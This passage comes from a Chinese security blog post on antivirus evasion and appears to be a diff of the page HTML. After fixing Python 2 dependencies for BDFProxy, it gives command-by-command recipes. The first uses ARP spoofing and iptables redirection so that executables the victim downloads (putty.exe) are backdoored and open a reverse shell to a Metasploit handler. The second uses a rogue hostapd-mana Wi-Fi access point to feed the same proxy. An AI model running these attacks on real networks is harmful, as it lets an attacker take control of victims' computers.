class="line">/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;./bdf_proxy.py&quot;</span>, line 49, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from configobj import ConfigObj</span><br><span class="line">**ImportError: No module named configobj**</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/future-0.18.3]</span><br><span class="line">└─<span class="comment"># **pip2** **install** **configobj**</span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                      </span></span><br><span class="line">Collecting configobj</span><br><span class="line">  Downloading configobj-5.0.8-py2.py3-none-any.whl (36 kB)</span><br><span class="line">Requirement already satisfied: six <span class="keyword">in</span> /usr/local/lib/python2.7/dist-packages (from configobj) (1.16.0)</span><br><span class="line">Installing collected packages: configobj</span><br><span class="line">Successfully installed configobj-5.0.8 **┌──(root㉿kali) -[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># ./bdf_proxy.py --help</span></span><br><span class="line">**/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">[!] Writing resource script.</span><br><span class="line">[!] Resource writen to bdfproxy_msf_resource.rc</span><br><span class="line">[!] Configuring traffic forwarding</span><br><span class="line">[*] Starting BDFProxy</span><br><span class="line">[*]          !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line">         ALERT: NEW VERSION AVAILABLE</span><br><span class="line">         *** ONLY AVAILABLE TO SPONSORS ***</span><br><span class="line">         SPONSOR THE NEXT VERSION HERE: https://github.com/sponsors/secretsquirrel</span><br><span class="line">         Author:    Joshua Pitts</span><br><span class="line">         Email:     the.midnite.runr[-at ]gmail&lt;d o-t&gt;com</span><br><span class="line">         Twitter:   @ausernamedjosh</span><br><span class="line">         SPONSOR THE NEXT VERSION HERE: https://github.com/sponsors/secretsquirrel</span><br><span class="line">         !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line">[*] Version: v0.3.8</span><br><span class="line">[*] Author: @midnite_runr | the[.]midnite).(runr&lt;at&gt;gmail|.|com</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230208163027589-1352751873.png" /></p>
+<p>总之，缺哪个安装哪个，不过有时候用 pip
+直接安装可能会失败，需要单独下载安装包手动安装，另须注意版本，版本不对可能会引进新的问题，以
+construct
+为例，安装2.10.54和2.8.8都会报如下错误，换成2.5.2即可正常。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">………………</span><br><span class="line">File <span class="string">&quot;/usr/local/lib/python2.7/dist-packages/libmproxy/contrib/tls/_constructs.py&quot;</span>, line 7, <span class="keyword">in</span> &lt;module&gt; from construct import (Array, Bytes, Struct, UBInt16, UBInt32, UBInt8, PascalString, Embed, TunnelAdapter, GreedyRange,</span><br><span class="line">ImportError: cannot import name UBInt16</span><br></pre></td></tr></table></figure>
+<p>更换 construct
+版本是发现个问题，直接用"uninstall"卸载会报错，，，如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/construct-2.8.8]</span><br><span class="line">└─<span class="comment"># pip2 uninstall construct        </span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.  </span></span><br><span class="line">Found existing installation: construct 2.10.54 **ERROR: Cannot uninstall <span class="string">&#x27;construct&#x27;</span>. It is a distutils installed project and thus we cannot accurately determine <span class="built_in">which</span> files belong to it <span class="built_in">which</span> would lead to only a partial uninstall.** </span><br></pre></td></tr></table></figure>
+<p>解决方法是直接将 "/usr/local/lib/python2.7/dist-packages/construct"
+文件清空，并删掉 "/usr/local/lib/python2.7/dist-packages" 下的
+construct-2.10.54.egg- info，再重新安装construct-2.5.2即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/usr/…/lib/python2.7/dist-packages/construct]</span><br><span class="line">└─<span class="comment"># rm -rf *</span></span><br><span class="line">zsh: sure you want to delete all 12 files <span class="keyword">in</span> /usr/local/lib/python2.7/dist-packages/construct [yn]? y</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/usr/…/lib/python2.7/dist-packages/construct]</span><br><span class="line">└─<span class="comment"># cd ..  </span></span><br><span class="line">┌──(root㉿kali)-[/usr/local/lib/python2.7/dist-packages]</span><br><span class="line">└─<span class="comment"># rm construct-2.10.54.egg-info </span></span><br><span class="line">…………</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/construct-2.5.2]</span><br><span class="line">└─<span class="comment"># python2 setup.py install</span></span><br><span class="line">/usr/lib/python2.7/distutils/dist.py:267: UserWarning: Unknown distribution option: <span class="string">&#x27;install_requires&#x27;</span></span><br><span class="line">  warnings.warn(msg)</span><br><span class="line">running install</span><br><span class="line">running build</span><br><span class="line">running build_py</span><br><span class="line">creating build</span><br><span class="line">creating build/lib.linux-x86_64-2.7</span><br><span class="line">creating build/lib.linux-x86_64-2.7/construct</span><br><span class="line">………………</span><br></pre></td></tr></table></figure>
+<h3 id="基于arp欺骗">2、基于ARP欺骗</h3>
+<ul>
+<li><strong>步骤【Kali2.0上演示】</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改 IP 转发</span></span><br><span class="line">sysctl -w net.ipv4.ip_forward=1</span><br><span class="line"><span class="comment">#修改 iptables</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080</span><br><span class="line"><span class="comment">#修改配置文件</span></span><br><span class="line">vi /etc/bdfproxy/bdfproxy.cfg</span><br><span class="line">proxyMode = transparent <span class="comment">#改为透明代理</span></span><br><span class="line">HOST = 192.168.159.129  <span class="comment">#修改反弹 shell 的地址（攻击者kali地址），注各种shell的地址</span></span><br><span class="line"><span class="comment">#启动 bdfproxy</span></span><br><span class="line">bdfproxy</span><br><span class="line"><span class="comment">#启动 msfconsole</span></span><br><span class="line">msfdb init <span class="comment">#初始化</span></span><br><span class="line">msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">jobs</span></span><br><span class="line"><span class="comment"># arp 欺骗</span></span><br><span class="line">arpspoof -i eth0 -t 192.168.159.133 192.168.159.2 <span class="comment">#前面的IP是靶机，后面是网关</span></span><br><span class="line"><span class="comment">#靶机浏览器浏览和下载putty.exe，</span></span><br><span class="line"><span class="comment">#靶机尝试下载执行软件并打开putty</span></span><br><span class="line"><span class="comment">#kali里有了反弹shell</span></span><br><span class="line">msf exploit(multi/handler) &gt; sessions -i 1 <span class="comment">#进入shell</span></span><br></pre></td></tr></table></figure>
+<p><strong>注</strong>
+，靶机的相应操作都能在kali的bdfproxy页面（或日志）里看到，putty下载页面：<a
+target="_blank" rel="noopener" href="https://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.63.html"
+class="uri">https://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.63.html</a></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207182505372-1908398020.gif" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207182157800-1386535916.png" /></p>
+<h3 id="无线流量劫持">3、无线流量劫持</h3>
+<h4 id="mana-安装">（1）mana 安装</h4>
+<ul>
+<li><strong>方法一【推荐】：</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get --<span class="built_in">yes</span> install build-essential pkg-config git libnl-genl-3-dev libssl-dev</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/sensepost/hostapd-mana</span><br><span class="line"><span class="built_in">cd</span> hostapd-mana</span><br><span class="line">make -C hostapd</span><br><span class="line"><span class="built_in">mv</span> /tmp/hostapd-mana/hostapd/ /usr/lib/mana-toolkit</span><br><span class="line"><span class="built_in">cd</span> /usr/share/</span><br><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/sensepost/mana.git</span><br><span class="line"><span class="built_in">mv</span> mana mana-toolkit</span><br><span class="line"><span class="built_in">mkdir</span> /etc/mana-toolkit/</span><br><span class="line"><span class="built_in">mv</span> mana-toolkit/run-mana/conf/*.conf /etc/mana-toolkit/</span><br></pre></td></tr></table></figure>
+<p>注，编译时可能会有警告，忽略即可</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230208165827852-1949583441.png" /></p>
+<ul>
+<li><strong>方法二：</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/sensepost/mana</span><br><span class="line"><span class="built_in">cd</span> mana</span><br><span class="line">git submodule init</span><br><span class="line">git submodule update</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<h4 id="演示-1">（2）演示</h4>
+<ul>
+<li><strong>修改WiFi基本信息，如 SSID 名称，信道，网卡等</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/mana-toolkit/hostapd-mana.conf </span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230208203841215-922005420.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改无线网卡适配器并启动</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/mana-toolkit/run-mana/ <span class="comment">#这里有很多脚本</span></span><br><span class="line"><span class="built_in">cp</span> start-nat-simple.sh mana.sh <span class="comment">#选择start-nat-simple.sh并不破坏他</span></span><br><span class="line">vi mana.sh</span><br><span class="line">phy=wlan0 <span class="comment">#修改为插入的无线网卡名</span></span><br><span class="line">iptables -F <span class="comment">#清空</span></span><br><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t nat -A PREROUTING -i <span class="variable">$phy</span> -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">iptables -t nat -A PREROUTING -i <span class="variable">$phy</span> -p tcp --dport 443 -j REDIRECT --to-ports 8080</span><br><span class="line"><span class="comment">#别的iptables都删掉</span></span><br><span class="line">./mana.sh</span><br><span class="line"><span class="comment">#插入无线网卡</span></span><br><span class="line"><span class="comment">#修改 IP 转发</span></span><br><span class="line">sysctl -w net.ipv4.ip_forward=1</span><br><span class="line"><span class="comment">#修改侦听 IP 地址并启动 bdfproxy</span></span><br><span class="line">vi /etc/bdfproxy/bdfproxy.cfg</span><br><span class="line">proxyMode = transparent</span><br><span class="line">bdfproxy</span><br><span class="line"><span class="comment">#启动 msf</span></span><br><span class="line">msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</span><br></pre></td></tr></table></figure>
+<p>操作和ARP的差不多，，，略，，，</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ghost
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2023/02/03/%E5%85%8D%E6%9D%80/" title="免杀">https://z9m8r8.github.io/2023/02/03/免杀/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/shell/" rel="tag"><i class="fa fa-tag"></i> shell</a>
+              <a href="/tags/%E5%85%8D%E6%9D%80/" rel="tag"><i class="fa fa-tag"></i> 免杀</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/02/03/redis-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" rel="prev" title="Redis 漏洞总结">
+                  <i class="fa fa-angle-left"></i> Redis 漏洞总结
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/02/24/linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/" rel="next" title="Linux 常用命令总结">
+                  Linux 常用命令总结 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ghost</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">187k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">11:19</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2023/02/03/%E5%85%8D%E6%9D%80/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
